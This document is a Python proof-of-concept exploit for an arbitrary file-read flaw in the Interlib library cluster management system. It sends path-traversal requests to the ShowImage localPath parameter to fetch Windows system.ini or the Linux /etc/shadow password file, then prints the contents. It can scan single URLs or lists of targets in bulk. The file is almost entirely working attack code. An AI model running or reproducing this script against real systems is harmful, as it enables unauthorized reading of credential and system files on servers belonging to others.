#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import urllib3
import sys
from bs4 import BeautifulSoup
import base64
urllib3.disable_warnings()

def title():
    print("""
                        Interlib图书馆集群管理系统任意文件读取
                          use: python3  Interlib-read.py
                                Author: Henry4E36
    """)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        target_url1 = self.url + "/interlib/report/ShowImage?localPath=C:Windows/system.ini"
        target_url2 = self.url + "/interlib/report/ShowImage?localPath=../etc/shadow"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }

        try:
            res1 = requests.get(url=target_url1,headers=headers,verify=False,timeout=5)
            if res1.status_code == 200 and "[drivers]" in res1.text:
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 为Windows系统，存在任意文件读取！\033[0m")
                print(f"[-] 正在读取 system.ini 文件......")
                print(f"\033[31m[{chr(8730)}\033[0m] 响应为:\n{res1.text.strip()}")
                print("[-------------------------------------------------------------]")
            else:
                res2 = requests.get(url=target_url2,headers=headers,verify=False,timeout=5)
                if res2.status_code == 200 and "root:" in res2.text:
                    print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 为Linux系统，存在任意文件读取！\033[0m")
                    print(f"[-] 正在读取 /etc/passwd 文件......")
                    print(f"\033[31m[{chr(8730)}\033[0m] 响应为:\n{res2.text.strip()}")
                    print("[-------------------------------------------------------------]")
                else:
                    print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在任意文件读取！")
                    print("[-------------------------------------------------------------]")

        except Exception as e:
            print(f"[\033[31mX\033[0m]  {self.url} 连接错误！")
            print("[-------------------------------------------------------------]")


    def file_url(self):
        with open(f"{self.file}","r") as urls:
            for url in urls:
                # 防止误操作存在空格了
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                # 去除空格
                self.url = url.strip()
                information.target_url(self)
        urls.close()

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="Interlib图书馆集群管理系统任意文件读取")
    parser.add_argument("-u", "--url", metavar="url", type=str, help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 Interlib-read.py -u http://127.0.0.1\neg2:>>>python3 Interlib-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
